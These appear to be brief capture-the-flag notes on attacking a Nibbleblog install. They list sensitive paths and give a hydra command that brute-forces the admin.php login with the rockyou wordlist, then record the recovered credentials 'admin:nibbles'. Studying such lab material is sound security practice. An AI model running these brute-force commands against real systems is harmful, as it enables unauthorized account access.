Nibbleblog is **a blog platform that uses XML databases as opposed to MySQL and others**. It is small, weighing in at less than half a megabyte and easy to install with a simple 1 step installer.

Interesting folders:
- /content/private/users.xml
- admin.php

```bash
hydra -l admin -P rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:&username=^USER^&password=^PASS^:Incorrect username or password." -F
```

Care with brute force --> blacklist
admin:nibbles
